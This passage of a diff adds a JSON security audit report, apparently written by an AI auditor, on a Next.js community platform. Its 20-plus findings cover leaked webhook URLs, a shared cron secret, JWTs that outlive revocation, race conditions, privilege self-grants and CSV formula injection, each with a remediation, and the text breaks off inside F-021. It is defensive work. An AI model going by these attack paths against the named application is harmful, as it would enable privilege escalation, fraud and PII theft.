@@ -1,0 +1,3381 @@
+{
+  "audit_date": "2026-05-03",
+  "repository": "team1-india",
+  "branch": "test",
+  "auditor": "Claude (autonomous orchestration)",
+  "spec_version": "3.0",
+  "scan_metadata": {
+    "platform": "Vercel",
+    "language": "TypeScript",
+    "framework": "Next.js 16.1.1 + Prisma 5.22 + NextAuth 4.24 + Postgres",
+    "categories_checked": 30,
+    "categories_applicable": 28,
+    "categories_na": [
+      "Cat 8 (multi-tenant \u2014 single tenant)",
+      "Cat 18 partial"
+    ],
+    "files_reviewed_count": 499,
+    "loc_reviewed_approx": 80000,
+    "roles_enumerated": [
+      "anonymous",
+      "PUBLIC",
+      "MEMBER",
+      "CORE",
+      "CORE+FULL_ACCESS",
+      "cron-secret-holder"
+    ],
+    "panels_enumerated": [
+      "app/public",
+      "app/auth",
+      "app/speedrun",
+      "app/member",
+      "app/core",
+      "app/core/admin"
+    ]
+  },
+  "severity_counts": {
+    "critical": 14,
+    "high": 31,
+    "medium": 59,
+    "low": 20,
+    "info": 8,
+    "total": 132
+  },
+  "findings": [
+    {
+      "id": "F-001",
+      "title": "NEXT_PUBLIC_SLACK_WEBHOOK_URL exposed in client bundle",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (7.4)",
+      "cwe": "CWE-200",
+      "owasp": "A02:2021 / A05:2021",
+      "affected_roles": [
+        "anonymous"
+      ],
+      "affected_panels": [
+        "all (any visitor)"
+      ],
+      "categories": [
+        "Cat 9",
+        "Cat 16",
+        "Cat 24",
+        "Cat 26"
+      ],
+      "location": {
+        "file": "lib/alertNotifications.ts",
+        "line_start": 32,
+        "line_end": 53,
+        "function": "sendSlackAlert"
+      },
+      "description": "The Slack incoming webhook URL is read from process.env.NEXT_PUBLIC_SLACK_WEBHOOK_URL inside lib/alertNotifications.ts. Because the variable is NEXT_PUBLIC_*-prefixed, Next.js bakes it into the client JS bundle at build time. Slack incoming webhooks accept POST from any origin with no token in headers (the URL itself is the credential), so any visitor can extract the URL via DevTools or the Network tab and POST arbitrary payloads to the team Slack indefinitely.",
+      "business_impact": "Untrusted spam in the team alerting channel \u2014 desensitization to real alerts. Phishing surface targeting employees directly inside their trusted comms tool. Indefinite abuse window until the webhook URL is rotated in Slack. Reputation loss if attacker also posts publicly attributable messages.",
+      "remediation": "Immediate: rotate the Slack webhook in the Slack workspace; remove NEXT_PUBLIC_SLACK_WEBHOOK_URL from Vercel env. Replace with SLACK_WEBHOOK_URL (no NEXT_PUBLIC_ prefix). Move the Slack-posting code from lib/alertNotifications.ts to a server-only module. Expose a thin authenticated server route POST /api/internal/alert that takes {severity, message}, verifies the caller is server-side, rate-limits per-user, and forwards to Slack using the secret URL. Add a CI check (grep for NEXT_PUBLIC_*WEBHOOK* in lib/) to prevent regression."
+    },
+    {
+      "id": "F-002",
+      "title": "NEXT_PUBLIC_ALERT_WEBHOOK_URL exposed in client bundle",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (7.4)",
+      "cwe": "CWE-200",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "anonymous"
+      ],
+      "affected_panels": [
+        "all (any visitor)"
+      ],
+      "categories": [
+        "Cat 16",
+        "Cat 24",
+        "Cat 26"
+      ],
+      "location": {
+        "file": "lib/alertNotifications.ts",
+        "line_start": 50,
+        "line_end": 56,
+        "function": null
+      },
+      "description": "A second webhook URL \u2014 used for the platform's custom alert channel \u2014 is exposed via NEXT_PUBLIC_ALERT_WEBHOOK_URL and embedded in the client bundle. The endpoint accepts POST from any origin with no signature verification. If the receiver is an internal monitoring/IR endpoint (PagerDuty, DataDog, Opsgenie), the attacker can inject false incidents, paging the on-call team and inducing alert fatigue.",
+      "business_impact": "DoS-by-paging of the on-call rotation. Erosion of alert trust; real incidents may be ignored. If integrated to PagerDuty: real cost in escalations / SMS / phone-call billing. Cover for parallel attacks while SRE attention is elsewhere.",
+      "remediation": "Same as F-001 \u2014 move to server-side with auth + rate limiting + signature. Receiver-side: per-source rate limit; reject events lacking HMAC signature."
+    },
+    {
+      "id": "F-003",
+      "title": "Single shared CRON_SECRET across 7 cron jobs (no per-job scoping, no HMAC, no IP allowlist)",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.6)",
+      "cwe": "CWE-798, CWE-306",
+      "owasp": "A07:2021",
+      "affected_roles": [
+        "anyone who learns the CRON_SECRET (compromised env, leaked log, dev laptop)"
+      ],
+      "affected_panels": [
+        "all 7 cron handlers \u2014 points/economy, event-sync, cleanup, speedrun-status, etc."
+      ],
+      "categories": [
+        "Cat 1",
+        "Cat 2",
+        "Cat 7",
+        "Cat 9",
+        "Cat 17",
+        "Cat 21",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": 2,
+        "line_end": 31,
+        "function": null
+      },
+      "description": "A single CRON_SECRET env var is the only authenticator on all 7 cron endpoints. The check is Authorization: Bearer ${CRON_SECRET} with no HMAC of body+timestamp, no IP allowlist (Vercel cron IP range or otherwise), no per-job secret, and no rate limiting. The cron handlers run with system-level DB access \u2014 expire-points mutates WalletTransaction/PointsBatch, sync-events polls Luma and mutates Event, cleanup deletes data. Any party that obtains this single bearer token gains unconstrained system-role write capability across the full application.",
+      "business_impact": "Mass economic loss (points expired prematurely \u2192 user churn, swag inventory deadlocked). No forensics: cron handler invocations don't carry caller identity. Single-secret blast radius spans all 7 sensitive jobs. Recovery requires DB rollback + secret rotation + every cron handler re-auditing.",
+      "remediation": "Per-job secrets: CRON_SECRET_EXPIRE_POINTS, CRON_SECRET_SYNC_EVENTS, etc. HMAC signature: header X-Cron-Signature: hmac_sha256(secret, timestamp+body), with timestamp drift \u2264 5 min to prevent replay. Vercel-native auth: switch to Vercel cron + native Cron Auth. IP allowlist: reject requests not from Vercel cron IP ranges. Rate limit per endpoint. AuditLog every cron invocation."
+    },
+    {
+      "id": "F-004",
+      "title": "Role downgrade does not invalidate existing JWTs (30-day grace for revoked admins)",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (7.2)",
+      "cwe": "CWE-613",
+      "owasp": "A07:2021",
+      "affected_roles": [
+        "any revoked or demoted admin / member"
+      ],
+      "affected_panels": [
+        "/core/* (entire admin surface)"
+      ],
+      "categories": [
+        "Cat 1",
+        "Cat 3",
+        "Cat 5",
+        "Cat 11"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 87,
+        "line_end": 198,
+        "function": "jwt callback / maxAge"
+      },
+      "description": "NextAuth uses strategy: 'jwt' with a 30-day maxAge. The jwt callback only runs at signin (or on explicit trigger: 'update'); on every subsequent request, the existing JWT is decoded and trusted as-is. There is no tokenVersion counter, no server-side revocation list, and no DB re-validation of role/permissions on every privileged op. When an admin is demoted, fired, or has permissions revoked, their existing JWT remains valid for up to 30 days. Logout only clears the cookie on the device that initiated logout \u2014 other devices retain the old JWT.",
+      "business_impact": "Incident response cannot instantly revoke admin access \u2014 30-day grace window for fired employees, compromised devices, leaked sessions. Insider-threat / disgruntled-employee scenarios become catastrophic. Combined with F-013 (audit log soft-delete), abuse can be retroactively covered up. Combined with F-038 (SW caches /core HTML), revoked admin can browse cached admin UI without even needing live JWT.",
+      "remediation": "Add tokenVersion: Int @default(0) to Member, CommunityMember, PublicUser. Increment on every permission/status change. Embed tokenVersion in the JWT at issuance. In lib/permissions.ts, re-fetch tokenVersion from DB on every privileged route and compare; reject if mismatch. Alternative: drop JWT strategy and use NextAuth's database strategy. Reduce maxAge to a sliding 7-day window. On any role/permission change, send a logout-all event."
+    },
+    {
+      "id": "F-005",
+      "title": "Idempotency key NOT enforced server-side \u2014 offline replay attacks on swag/quest/bounty",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (6.5)",
+      "cwe": "CWE-352, CWE-841",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any authenticated user (member or public)"
+      ],
+      "affected_panels": [
+        "/swag",
+        "/quests",
+        "/bounty",
+        "/experiments (PWA-online and offline-replay paths)"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 15",
+        "Cat 28",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "lib/offlineStorage.ts",
+        "line_start": 11,
+        "line_end": 22,
+        "function": null
+      },
+      "description": "The PWA generates idempotency keys client-side and stores actions in IndexedDB. When the client comes online, backgroundSync POSTs the action \u2014 but the Idempotency-Key header is not included, and the server route handlers do not look for it. The server has no dedup; an attacker can replay any state-changing request multiple times by re-queuing in IndexedDB, manually re-issuing via DevTools, or curl after a real submission.",
+      "business_impact": "Direct economic loss: swag inventory drained at half cost; admin must manually reconcile. No AuditLog to detect (compounded by F-092). Combined with F-023: attacker can guarantee oversells via timing. Combined with F-009: attacker farms double XP/points on every one-time quest.",
+      "remediation": "Server-side idempotency layer: add lib/idempotency.ts that wraps mutating route handlers. Use Redis or DB-backed store keyed by Idempotency-Key header. TTL \u2265 24h; cache the response so replays return identical 201. Update backgroundSync.ts to forward Idempotency-Key header. Add IdempotencyKey Prisma model with @@unique([key]). Wrap swag/redeem, quests/completions, bounty/submissions, experiments/contributions, wallet/adjust, applications POSTs."
+    },
+    {
+      "id": "F-006",
+      "title": "PBKDF2 static salt in encryptedSession (cross-user rainbow table)",
+      "severity": "Critical",
+      "cvss_3_1": "AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N (5.4)",
+      "cwe": "CWE-759",
+      "owasp": "A02:2021",
+      "affected_roles": [
+        "any user with an encryptedSession blob; attacker with DB read"
+      ],
+      "affected_panels": [
+        "all panels using encryptedSession"
+      ],
+      "categories": [
+        "Cat 20"
+      ],
+      "location": {
+        "file": "lib/encryptedSession.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "PBKDF2 key derivation in lib/encryptedSession.ts uses a constant salt (compiled into the binary, identical for every user). PBKDF2 with a static salt allows an attacker who exfiltrates the encrypted blobs (e.g., DB dump) to precompute one rainbow table that covers every user \u2014 defeating PBKDF2's intended per-secret cost amplification.",
+      "business_impact": "Mass-decryption of session blobs if DB is ever exfiltrated. Eliminates the N-times cost amplification PBKDF2 was supposed to provide. Compliance: DPDP / GDPR may flag as 'inappropriate technical measure'.",
+      "remediation": "Generate a per-user random salt (\u2265 16 bytes from crypto.randomBytes) and store alongside the encrypted blob. Concatenate salt + ciphertext + tag in the stored field, parse on decryption. Migration: re-encrypt existing rows on next user login (lazy migration). Increase PBKDF2 iteration count to current OWASP recommendation (\u2265 600,000 for SHA-256), or migrate to Argon2id."
+    },
+    {
+      "id": "F-007",
+      "title": "No /api/me/delete endpoint \u2014 Right-to-Erasure unimplemented (GDPR Art. 17 / DPDP \u00a713)",
+      "severity": "Critical",
+      "cwe": "CWE-359",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "all data subjects (users in EU, India, UK)"
+      ],
+      "affected_panels": [
+        "/api/me/* (no deletion route)"
+      ],
+      "categories": [
+        "Cat 13",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "app/api/me/",
+        "line_start": null,
+        "line_end": null,
+        "function": "missing"
+      },
+      "description": "There is no DELETE /api/me route; users cannot erase their own data. The schema has deletedAt (soft-delete) on Member, CommunityMember, PublicUser, but no cascade strategy for related tables (UserWallet, WalletTransaction, Application, QuestCompletion, BountySubmission, SwagOrder, SpeedrunRegistration, Notification, AuditLog.metadata). Even if a user's PublicUser row is soft-deleted, plaintext PII persists in those child tables forever. GDPR Art. 17 and DPDP \u00a713 require erasure on request within 30 days.",
+      "business_impact": "Direct regulatory fine exposure on first complaint. Inability to demonstrate 'appropriate technical and organizational measures' (Art. 32). Customer trust loss in EU/UK markets. Fines up to \u20ac20M/4% global turnover (GDPR) or \u20b9250 crore (DPDP).",
+      "remediation": "Build DELETE /api/me with re-auth (password / 2FA challenge). Map every PII-bearing table; produce a deterministic erasure cascade (hard-delete PublicUser/Member; null-out PII columns on related rows but retain row for ledger integrity; tombstone in AuditLog). Coordinate with Vercel Analytics: call delete-by-userId API. Document the erasure runbook + DPA/ROPA per Art. 30. Add admin 'Erasure dashboard' with audit log."
+    },
+    {
+      "id": "F-008",
+      "title": "CSP includes 'unsafe-inline' and 'unsafe-eval' in script-src",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (8.3)",
+      "cwe": "CWE-1021, CWE-79",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "any user; reflected/stored XSS vector becomes catastrophic"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 10",
+        "Cat 16",
+        "Cat 17",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": 29,
+        "line_end": 43,
+        "function": null
+      },
+      "description": "The Content-Security-Policy header allows 'unsafe-inline' and 'unsafe-eval' in script-src (and 'unsafe-inline' in style-src). These directives defeat the core XSS-mitigation that CSP exists to provide: any injected <script>, inline onclick=, javascript: URI, eval() or new Function() payload will execute. Combined with F-033 (innerHTML in playbooks/markdown editor) and F-075 (Luma data unsanitised), a stored-XSS in a single rich-text field becomes account-takeover-grade.",
+      "business_impact": "Single XSS sink \u2192 admin compromise (chained with F-011 single-admin escalation). All cookies (__Secure-next-auth.session-token) are HttpOnly, but fetch() from an XSS context already carries them, so HttpOnly does not help.",
+      "remediation": "Move toward strict CSP: script-src 'self' 'nonce-XXX' 'strict-dynamic'. Generate per-request nonces in middleware, inject into <Script nonce={nonce}> tags. Migrate Vercel Analytics + Speedrun Insights to nonce-aware loading (or self-host). Drop 'unsafe-eval' (audit which lib uses eval()). Drop 'unsafe-inline' from style-src after auditing. Add require-trusted-types-for 'script' (see F-032)."
+    },
+    {
+      "id": "F-009",
+      "title": "Race condition on quest completion grant (one-time bypass via concurrent POST)",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (5.3)",
+      "cwe": "CWE-362, CWE-841",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/quests"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 28",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "app/api/quests/[id]/completions/route.ts",
+        "line_start": 54,
+        "line_end": 96,
+        "function": null
+      },
+      "description": "For one-time quests with proofRequired: false (auto-approve path), the route executes findUnique, then create, then earnReward, then update \u2014 these are not wrapped in a single transaction with the uniqueness check. Two near-simultaneous POSTs both pass the findUnique step, then both proceed. The unique constraint will reject the second create, but the first one might already have triggered a duplicate earnReward call by the time the second one rolls back. Net: double award.",
+      "business_impact": "Direct economic inflation; downstream swag drained. No audit trail (compounded by F-092). Leaderboard integrity compromised.",
+      "remediation": "Wrap the uniqueness check + create + earnReward in a single prisma.$transaction with isolationLevel: 'Serializable'. Move earnReward into the same transaction as the create; use tx.userWallet.update instead of opening a nested TX. For bulk-review, lock rows with SELECT ... FOR UPDATE before approving and crediting. Add per-user-per-quest rate limit (1 attempt per 10s) as defense-in-depth."
+    },
+    {
+      "id": "F-010",
+      "title": "Cron job idempotency missing (timeout-retry double-execution of expire-points / sync-events)",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H (6.0)",
+      "cwe": "CWE-362, CWE-754",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "Vercel cron / system; impacts all users"
+      ],
+      "affected_panels": [
+        "points/economy",
+        "events sync"
+      ],
+      "categories": [
+        "Cat 9",
+        "Cat 12",
+        "Cat 28"
+      ],
+      "location": {
+        "file": "app/api/cron/expire-points/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Vercel cron retries on 5xx or timeout (default 3 retries with backoff). The cron handlers (expire-points, sync-events, cleanup, speedrun-status) have no idempotency guard. If the function times out partway through a long iteration, Vercel retries; the next invocation re-processes some batches that were already expired \u2014 WalletTransaction may double-record or pointsBalance may double-decrement.",
+      "business_impact": "Silent economic loss to users; trust erosion. No alert (compounded by F-028). Reconciliation requires manual SQL forensics.",
+      "remediation": "Make every cron handler idempotent: each iteration must filter on a 'not-yet-processed' predicate (WHERE expiredAt IS NULL). Use a CronRunHistory table; skip if a run with the same logical scheduled time already succeeded. Configure explicit maxDuration in vercel.json per function. Add chunked-processing with checkpointing."
+    },
+    {
+      "id": "F-011",
+      "title": "Permission endpoint relies on cached JWT claim (admin revocation effective only after 30d)",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (7.2)",
+      "cwe": "CWE-639",
+      "owasp": "A01:2021",
+      "affected_roles": [
+        "revoked CORE admin"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 1",
+        "Cat 2",
+        "Cat 3",
+        "Cat 5"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/permissions/route.ts",
+        "line_start": 19,
+        "line_end": 26,
+        "function": null
+      },
+      "description": "PUT /api/members/[id]/permissions checks session.user.permissions (sourced from the JWT) for the '*':'FULL_ACCESS' claim. The JWT was issued at signin with the user's permissions snapshot from that moment; subsequent DB updates to that user's permissions JSON do not invalidate the JWT (same root cause as F-004). An admin whose FULL_ACCESS is revoked can still call the permission-grant endpoint for up to 30 days using their cached JWT.",
+      "business_impact": "The endpoint is the highest-leverage admin action \u2014 granting FULL_ACCESS. A revoked admin can bootstrap a permanent backdoor (a sock-puppet account with FULL_ACCESS) before their JWT expires.",
+      "remediation": "Re-fetch member.permissions from DB at the top of every request to this endpoint; compare against JWT and reject if mismatch (this is in addition to, not instead of, F-004's tokenVersion approach). Implementing this single endpoint guard is a strong stopgap before the broader F-004 remediation lands."
+    },
+    {
+      "id": "F-012",
+      "title": "Single super-admin (FULL_ACCESS) can self-grant or grant any privilege; no 4-eyes / SoD",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (7.2)",
+      "cwe": "CWE-732, CWE-1220",
+      "owasp": "A01:2021",
+      "affected_roles": [
+        "any FULL_ACCESS admin"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 3",
+        "Cat 5",
+        "Cat 7",
+        "Cat 27",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/permissions/route.ts",
+        "line_start": 43,
+        "line_end": 46,
+        "function": null
+      },
+      "description": "The permission-grant endpoint accepts a single super-admin's signature as sufficient to grant '*':'FULL_ACCESS' to any other member \u2014 including themselves. No 4-eyes (second-approver) workflow exists; no audit-then-approve gate; no time-delay; no notification to other admins. A single compromised FULL_ACCESS session is total compromise.",
+      "business_impact": "No defense-in-depth against insider risk. Compliance frameworks (SOX, ISO 27001) require SoD on privilege grants. Single point of failure: 1 leaked FULL_ACCESS session = total compromise.",
+      "remediation": "4-eyes for FULL_ACCESS grants: require two FULL_ACCESS approvers. No self-grant: explicit check that targetMemberId !== session.user.id for FULL_ACCESS grants. Notification: broadcast to a dedicated admin Slack channel (server-side, after F-001 remediation). Time-delay: queue privilege grants with a 1h cooling-off window. AuditLog every grant attempt."
+    },
+    {
+      "id": "F-013",
+      "title": "Audit log soft-delete + admin write path = compromised admin can erase tracks",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N (5.7)",
+      "cwe": "CWE-117, CWE-778",
+      "owasp": "A09:2021",
+      "affected_roles": [
+        "any compromised admin OR DB-write attacker"
+      ],
+      "affected_panels": [
+        "/core/audit-log"
+      ],
+      "categories": [
+        "Cat 1",
+        "Cat 7",
+        "Cat 25",
+        "Cat 27",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": 277,
+        "line_end": 296,
+        "function": null
+      },
+      "description": "AuditLog has a deletedAt: DateTime? column, allowing soft-delete. There is no Postgres trigger preventing UPDATE/DELETE on the table, and no off-platform replication (no Axiom/Splunk/DataDog mirror). A compromised admin (or anyone with DB write \u2014 F-014, F-045) can soft-delete or modify entries to cover their tracks. Permission-change activity additionally goes to a separate Log table via logActivity() rather than AuditLog \u2014 splitting the audit surface.",
+      "business_impact": "Insider threats are unprovable post-hoc. SOC 2 / ISO 27001 / DPDP audit-trail-immutability requirement violated. Incident response loses ground truth.",
+      "remediation": "Remove deletedAt from AuditLog; if archival is needed, partition by month. Postgres trigger preventing UPDATE/DELETE. Off-platform sink: mirror every AuditLog insert to an external append-only log service (Axiom/Splunk/CloudWatch). Hash chain: add prevHash column. Unify: route logActivity() permission-change writes into AuditLog instead of separate Log."
+    },
+    {
+      "id": "F-014",
+      "title": "NEXTAUTH_SECRET potentially shared between preview and prod deployments",
+      "severity": "Critical",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0)",
+      "cwe": "CWE-798, CWE-540",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "anyone able to deploy a preview branch"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 3",
+        "Cat 23",
+        "Cat 26",
+        "Cat 29"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": "Vercel project env config (out of repo)"
+      },
+      "description": "Open assumption (cannot be verified from source alone): if Vercel preview deployments use the same NEXTAUTH_SECRET and DATABASE_URL as production, then any contributor with PR-merge or preview-deploy rights can issue JWTs valid against production, and read/write the production DB. Preview deployments typically run untrusted PR code with full env access.",
+      "business_impact": "Total system compromise via PR; arguably the highest-impact finding in the audit (if confirmed). Attacker opens PR adding /api/dump that prints process.env or reads DB; Vercel auto-deploys against prod env; attacker exfiltrates secrets, forges JWTs, accesses prod with admin rights.",
+      "remediation": "Verify in Vercel UI: confirm that NEXTAUTH_SECRET, DATABASE_URL, CRON_SECRET, CLOUDINARY_API_SECRET, BLOB_READ_WRITE_TOKEN, LUMA_API_KEY, SMTP_PASS are scoped only to Production env (not Preview or Development). Provision separate preview/staging DB and secrets. Require admin approval (Vercel Deployment Protection). Document this in docs/deployment-checklist.md. Add startup check."
+    },
+    {
+      "id": "F-015",
+      "title": "Vertical escalation \u2014 CORE user with members:FULL_ACCESS can self-grant *:FULL_ACCESS",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (7.2)",
+      "cwe": "CWE-269",
+      "owasp": "A01:2021",
+      "affected_roles": [
+        "CORE with partial members:FULL_ACCESS permission"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 3",
+        "Cat 5",
+        "Cat 7"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/permissions/route.ts",
+        "line_start": 19,
+        "line_end": 46,
+        "function": null
+      },
+      "description": "The endpoint's authorization gate accepts either permissions['*'] === 'FULL_ACCESS' or permissions['default'] === 'FULL_ACCESS'. There is no second check verifying the actor is allowed to grant the target permission key \u2014 so a CORE user with only members:FULL_ACCESS can issue a PUT setting their own permissions = { '*': 'FULL_ACCESS' }, escalating to global super-admin.",
+      "business_impact": "Any CORE admin with any FULL_ACCESS scope is one HTTP call away from total privilege.",
+      "remediation": "Tighten the check: only allow privilege grants if the actor has FULL_ACCESS at the level being granted (grants of '*' require the actor to currently hold '*':'FULL_ACCESS'). Add explicit 'no self-grant of higher privilege' rule. Pair with F-012 4-eyes flow."
+    },
+    {
+      "id": "F-016",
+      "title": "Member.email returned to CORE without masking (mass PII enumeration risk)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9)",
+      "cwe": "CWE-359",
+      "owasp": "A01:2021 / A04:2021",
+      "affected_roles": [
+        "any CORE"
+      ],
+      "affected_panels": [
+        "/core/members (admin list)"
+      ],
+      "categories": [
+        "Cat 6",
+        "Cat 13"
+      ],
+      "location": {
+        "file": "app/api/members/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "GET /api/members returns the full Member row including email, permissions, signupIp, tags, etc. to every CORE caller. There is no role-tier scoping; every CORE user can enumerate the entire admin/staff PII set. With 100+ members this is a meaningful PII trove if a single CORE account is compromised.",
+      "business_impact": "Privilege topology disclosure accelerates targeted attacks; PII leak. Junior CORE member's session hijack enables full admin enumeration and spear-phishing of super-admins (chained with F-001).",
+      "remediation": "Mask email in list views (e.g., j***@team1.io); show full email only on detail view, gated by activity log. Strip permissions, signupIp, internal tags from the list response. Audit every CORE read of /api/members. Alert if any single CORE pulls > 50 member rows in 1h."
+    },
+    {
+      "id": "F-017",
+      "title": "SpeedrunRegistration CSV export streams unmasked PII; not logged, not rate-limited",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N (5.4)",
+      "cwe": "CWE-359, CWE-770, CWE-778, CWE-1236",
+      "owasp": "A01:2021, A09:2021",
+      "affected_roles": [
+        "CORE"
+      ],
+      "affected_panels": [
+        "/core/speedrun"
+      ],
+      "categories": [
+        "Cat 6",
+        "Cat 7",
+        "Cat 13",
+        "Cat 19",
+        "Cat 25",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "app/api/speedrun/registrations/export/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "The CSV export endpoint streams every Speedrun registration (name, email, phone, school, team, captain status, referral source) without per-row scoping, no rate-limiting, no audit logging, and no formula-injection prefix (=, +, -, @, TAB) \u2014 see also F-078. A single CORE pull can export thousands of PII rows; a malicious CSV with =HYPERLINK(...) triggers code execution when opened in Excel/Sheets.",
+      "business_impact": "Mass PII breach (DPDP / GDPR notifiable); CSV-injection RCE on admin laptops opening the export.",
+      "remediation": "Audit-log every export call: (actor, queryParams, rowCount). Rate-limit to 1 export per CORE per hour. Apply formula-injection prefix: prepend ' to any cell starting with = + - @ TAB. Add Content-Type text/csv; charset=utf-8 and Content-Disposition: attachment. Mask email/phone unless caller has speedrun:export-pii explicit grant. Watermark export."
+    },
+    {
+      "id": "F-018",
+      "title": "TOTP secret returned in 2FA setup response (secret materially exposed mid-flow)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N (7.4)",
+      "cwe": "CWE-522",
+      "owasp": "A02:2021",
+      "affected_roles": [
+        "any user enrolling 2FA"
+      ],
+      "affected_panels": [
+        "/me/2fa setup"
+      ],
+      "categories": [
+        "Cat 6"
+      ],
+      "location": {
+        "file": "app/api/me/2fa/totp/setup/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": "2FA setup route"
+      },
+      "description": "The 2FA TOTP setup response returns the generated secret plaintext (in addition to the QR code). Any intermediary (browser extension, network MITM if not on HTTPS, browser cache, error-tracking service) that captures the response captures the secret in perpetuity. The secret should only be embedded in the QR-code image stream and never in JSON.",
+      "business_impact": "Defeats the entire purpose of TOTP 2FA \u2014 attacker can generate valid codes alongside the user.",
+      "remediation": "Return only the QR-code data URL or a server-rendered SVG; never include the raw secret. If 'manual entry' UX is needed, expose the secret via a separate, very-short-lived (60s) one-time read endpoint that the user explicitly requests. Log the secret-disclosure read into AuditLog."
+    },
+    {
+      "id": "F-019",
+      "title": "Member.permissions JSON visible to all CORE users (privilege map enumeration)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N (3.6)",
+      "cwe": "CWE-200",
+      "owasp": "A01:2021",
+      "affected_roles": [
+        "CORE"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 6"
+      ],
+      "location": {
+        "file": "app/api/members/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Every CORE caller receives the full permissions JSON for every member in the list response. This reveals the privilege topology \u2014 who has FULL_ACCESS, who can grant which scopes \u2014 turning the panel into a target-prioritization map for compromised CORE sessions.",
+      "business_impact": "Accelerates lateral / vertical escalation pathways. Privilege map drastically reduces attacker effort to identify the highest-leverage account to target.",
+      "remediation": "Hide permissions from list responses; show only on a dedicated permissions-detail view gated by members:FULL_ACCESS. Audit reads of /api/members?include=permissions."
+    },
+    {
+      "id": "F-020",
+      "title": "Application.data form-response PII visible to any FULL_ACCESS admin without per-program scoping",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9)",
+      "cwe": "CWE-285",
+      "owasp": "A01:2021",
+      "affected_roles": [
+        "FULL_ACCESS admins; broader if programs:READ"
+      ],
+      "affected_panels": [
+        "/core/programs/[id]/applications"
+      ],
+      "categories": [
+        "Cat 6"
+      ],
+      "location": {
+        "file": "app/api/applications/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Application responses (free-text answers including phone numbers, addresses, identification, financial info collected during program intake) are returned to any FULL_ACCESS admin regardless of whether they are a designated reviewer for that program. There is no per-program ACL.",
+      "business_impact": "Cross-program PII access for admins not legitimately involved in a specific program; insider-data-misuse risk; compliance exposure under data-minimization principles.",
+      "remediation": "Add ProgramReviewerAssignment model; gate /api/programs/[id]/applications on assignment membership. Mask sensitive fields by default; require explicit 'view PII' action that is audit-logged. Audit reads with row counts; alert if a single admin reads applications across > 3 programs."
+    },
+    {
+      "id": "F-021",
+      "title": "Soft-deleted users still pass signIn callback (offboarded admin can re-login)",
+      "severity": "High",
